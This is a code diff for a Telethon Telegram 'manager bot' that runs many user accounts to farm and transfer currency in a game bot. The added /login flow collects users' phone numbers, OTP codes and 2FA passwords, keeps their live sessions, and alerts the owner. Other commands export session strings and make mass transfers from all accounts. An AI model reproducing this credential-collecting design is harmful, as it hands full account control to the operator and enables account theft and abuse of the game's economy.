@@ -6,6 +6,7 @@ import os
 import re
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 
 import config
 import database
@@ -17,13 +18,13 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler(config.LOG_FILE), # Saves logs to file
-        logging.StreamHandler()               # Prints logs to console
+        logging.FileHandler(config.LOG_FILE),
+        logging.StreamHandler()
     ]
 )
 logger = logging.getLogger(__name__)
 
-# Initialize the Manager Bot
+# Initialize Manager Bot
 bot = TelegramClient('manager_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)
 
 # --- 2. HELPER FUNCTIONS ---
@@ -34,16 +35,25 @@ async def get_balance_for_user(user_id, client):
         async with client.conversation(config.TARGET_BOT, timeout=10) as conv:
             await conv.send_message('/extols')
             response = await conv.get_response()
-            
-            # Regex to find amount: Є459
             match = re.search(r'Є(\d+)', response.text)
             balance = int(match.group(1)) if match else 0
-            
             me = await client.get_me()
             name = f"[{me.first_name}](tg://user?id={me.id})"
             return (name, balance, None)
     except Exception as e:
         return ("Unknown", 0, str(e))
+
+async def register_client(uid, client):
+    """Saves a connected client to the database."""
+    me = await client.get_me()
+    database.clients[uid] = client
+    database.user_data[uid] = {
+        'extols': 0, 
+        'next_play_time': 0, 
+        'name': me.first_name
+    }
+    await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
+    logger.info(f"User Login: {me.first_name} ({uid})")
 
 # --- 3. COMMAND HANDLERS ---
 
@@ -56,56 +66,115 @@ async def help_cmd(event):
     text = (
         "🛠 **COMMAND MENU**\n"
         "━━━━━━━━━━━━━━━━\n"
+        "**🔑 Login Options:**\n"
+        "`/login` - Login via Phone Number + OTP\n"
+        "`/slogin` - Login via String Session (Faster)\n"
+        "`/logout` - Disconnect account\n\n"
         "**💰 Finance:**\n"
-        "`/check` - Audit all bot balances (Live)\n"
-        "`/self_reply {all|id} {group_id} {amount}` - Mass transfer funds\n\n"
+        "`/check` - Audit all bot balances\n"
+        "`/self_reply {all|id} {group_id} {amount}` - Mass transfer\n\n"
         "**👤 Management:**\n"
-        "`/login` - Connect account (String Session)\n"
-        "`/logout` - Disconnect account\n"
         "`/slot` - Join farming queue (Self)\n"
         "`/allslot` - Force start ALL bots\n"
-        "`/stats` - View Global Stats & Uptime\n"
+        "`/stats` - View Global Stats\n"
         "`/log` - View System Logs\n"
         "`/sessionexport` - Backup sessions\n"
-        "`/sessionimport` - Restore sessions\n"
         "━━━━━━━━━━━━━━━━"
     )
     await event.respond(text)
 
-# --- LOGIN / LOGOUT ---
+# --- OPTION A: SESSION LOGIN (/slogin) ---
 
-@bot.on(events.NewMessage(pattern='/login'))
-async def login_cmd(event):
+@bot.on(events.NewMessage(pattern='/slogin'))
+async def slogin_cmd(event):
     async with bot.conversation(event.sender_id) as conv:
         await conv.send_message("Send your **String Session**:")
         response = await conv.get_response()
         
         try:
-            # Attempt to connect using the string session
             client = TelegramClient(StringSession(response.text.strip()), config.API_ID, config.API_HASH)
             await client.connect()
             
             if not await client.is_user_authorized():
-                await conv.send_message("❌ Invalid Session or Revoked.")
+                await conv.send_message("❌ Invalid Session.")
                 return
 
-            me = await client.get_me()
-            uid = event.sender_id
-            
-            # Save to Database
-            database.clients[uid] = client
-            database.user_data[uid] = {
-                'extols': 0, 
-                'next_play_time': 0, 
-                'name': me.first_name
-            }
-            
-            await conv.send_message(f"✅ **Connected:** {me.first_name}\nUse `/slot` to start farming.")
-            await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
-            logger.info(f"User Login: {me.first_name} ({uid})")
+            await register_client(event.sender_id, client)
+            await conv.send_message(f"✅ **Connected via Session!**\nUse `/slot` to start farming.")
         
         except Exception as e:
             await conv.send_message(f"Error: {e}")
+
+# --- OPTION B: PHONE LOGIN (/login) ---
+
+@bot.on(events.NewMessage(pattern='/login'))
+async def login_cmd(event):
+    user_id = event.sender_id
+    
+    # Start an interactive conversation
+    async with bot.conversation(user_id, timeout=300) as conv:
+        try:
+            # 1. Ask for Phone Number
+            await conv.send_message("📱 **Phone Login**\n\nPlease enter your phone number (with country code, e.g., `+919876543210`):")
+            phone_msg = await conv.get_response()
+            phone_number = phone_msg.text.strip()
+
+            # 2. Initialize a temporary client
+            status_msg = await conv.send_message("🔄 Connecting to Telegram...")
+            temp_client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
+            await temp_client.connect()
+
+            # 3. Send OTP Request
+            try:
+                await temp_client.send_code_request(phone_number)
+            except Exception as e:
+                await status_msg.edit(f"❌ Failed to send code: {e}")
+                await temp_client.disconnect()
+                return
+
+            # 4. Ask for OTP
+            await status_msg.delete()
+            await conv.send_message("📩 **OTP Sent!**\nPlease enter the code you received (format: `1 2 3 4 5` or `12345`):")
+            code_msg = await conv.get_response()
+            phone_code = code_msg.text.replace(' ', '')
+
+            # 5. Sign In
+            try:
+                await temp_client.sign_in(phone_number, phone_code)
+            except SessionPasswordNeededError:
+                # 6. Handle 2FA Password
+                await conv.send_message("🔐 **2FA Password Required:**\nThis account has a password. Please enter it:")
+                pwd_msg = await conv.get_response()
+                password = pwd_msg.text.strip()
+                try:
+                    await temp_client.sign_in(password=password)
+                except Exception as e:
+                    await conv.send_message(f"❌ Login Failed: {e}")
+                    await temp_client.disconnect()
+                    return
+            except PhoneCodeInvalidError:
+                await conv.send_message("❌ Invalid Code.")
+                await temp_client.disconnect()
+                return
+            except Exception as e:
+                await conv.send_message(f"❌ Error: {e}")
+                await temp_client.disconnect()
+                return
+
+            # 7. Success - Register Client
+            await register_client(user_id, temp_client)
+            
+            # Save the session string internally so it persists on restart if you export/import
+            saved_session = temp_client.session.save()
+            
+            await conv.send_message("✅ **Login Successful!**\nYou are now connected.")
+
+        except asyncio.TimeoutError:
+            await conv.send_message("❌ **Timeout.** Login took too long.")
+        except Exception as e:
+            await conv.send_message(f"❌ **Error:** {e}")
+
+# --- LOGOUT ---
 
 @bot.on(events.NewMessage(pattern='/logout'))
 async def logout_cmd(event):
@@ -130,7 +199,6 @@ async def slot_cmd(event):
     if uid not in database.farming_queue:
         database.farming_queue.append(uid)
         await event.respond("✅ **Added to Queue.** Waiting for turn...")
-        # Trigger the worker if it's not running
         asyncio.create_task(worker.start_relay_race())
     else:
         await event.respond("⚠️ Already in queue.")
@@ -159,7 +227,6 @@ async def stats_cmd(event):
         f"⏳ Uptime: {utils.get_uptime()}\n\n"
         f"**User Breakdown:**\n"
     )
-    
     for uid, data in database.user_data.items():
         status_icon = utils.format_status(uid, database.current_active_user)
         msg += f"❑ {data['name']} ‹`{uid}`› — {data['extols']} — {status_icon}\n"
@@ -172,49 +239,36 @@ async def stats_cmd(event):
 @bot.on(events.NewMessage(pattern='/check', from_users=[config.OWNER_ID]))
 async def check_cmd(event):
     status_msg = await event.respond("⏳ **Auditing Wallets...**\nContacting Zoro Bot from all accounts.")
-    
     tasks = []
-    # Create a task for every connected client
     for uid, client in database.clients.items():
         tasks.append(get_balance_for_user(uid, client))
     
-    # Run all checks in parallel
     results = await asyncio.gather(*tasks)
-    
     total_extols = 0
     msg = "💰 **WALLET AUDIT**\n━━━━━━━━━━━━━━━━\n"
-    
     for name, balance, error in results:
         if error:
             msg += f"» {name} - ⚠️ Error\n"
         else:
             msg += f"» {name} - Є{balance}\n"
             total_extols += balance
-            
     msg += f"━━━━━━━━━━━━━━━━\n➤ **Total - Є{total_extols}**"
-    
     await status_msg.edit(msg)
 
 # --- SELF REPLY / TRANSFER COMMAND ---
 
 @bot.on(events.NewMessage(pattern=r'/self_reply (all|(?:\d+)) (-?\d+) (\d+)', from_users=[config.OWNER_ID]))
 async def self_reply_cmd(event):
-    """
-    Format: /self_reply {all/user_id} {group_id} {amount}
-    Must be sent AS A REPLY to the destination message.
-    """
     if not event.is_reply:
         return await event.respond("❌ **Error:** Reply to the message you want the funds sent to.")
     
-    # Parse arguments
-    target_mode = event.pattern_match.group(1) # 'all' or user_id
+    target_mode = event.pattern_match.group(1) 
     group_id = int(event.pattern_match.group(2))
     amount = int(event.pattern_match.group(3))
     
     reply_msg = await event.get_reply_message()
     target_msg_id = reply_msg.id
     
-    # Select Clients
     active_clients = []
     if target_mode == 'all':
         active_clients = list(database.clients.values())
@@ -231,16 +285,14 @@ async def self_reply_cmd(event):
     count = 0
     for client in active_clients:
         try:
-            # /give@roronoa_zoro_robot 1000
             cmd_text = f"/give@{config.TARGET_BOT_USERNAME} {amount}"
-            
             await client.send_message(
                 entity=group_id,
                 message=cmd_text,
                 reply_to=target_msg_id
             )
             count += 1
-            await asyncio.sleep(0.8) # Stagger slightly
+            await asyncio.sleep(0.8) 
         except Exception as e:
             logger.error(f"Transfer failed for {client}: {e}")
             
@@ -303,17 +355,12 @@ async def import_sessions(event):
     
     try:
         with open(path, 'r') as f: data = json.load(f)
-        
         success_count = 0
         for uid_str, session_str in data.items():
             try:
                 client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
                 await client.connect()
-                me = await client.get_me()
-                uid = me.id
-                
-                database.clients[uid] = client
-                database.user_data[uid] = {'extols': 0, 'next_play_time': 0, 'name': me.first_name}
+                await register_client(int(uid_str), client)
                 success_count += 1
             except Exception as e:
                 logger.error(f"Import fail for {uid_str}: {e}")
@@ -323,6 +370,6 @@ async def import_sessions(event):
     except Exception as e:
         await status_msg.edit(f"❌ **Import Failed:** {e}")
 
-# --- START THE BOT ---
+# --- START ---
 print("✅ Manager Bot Started...")
 bot.run_until_disconnected()
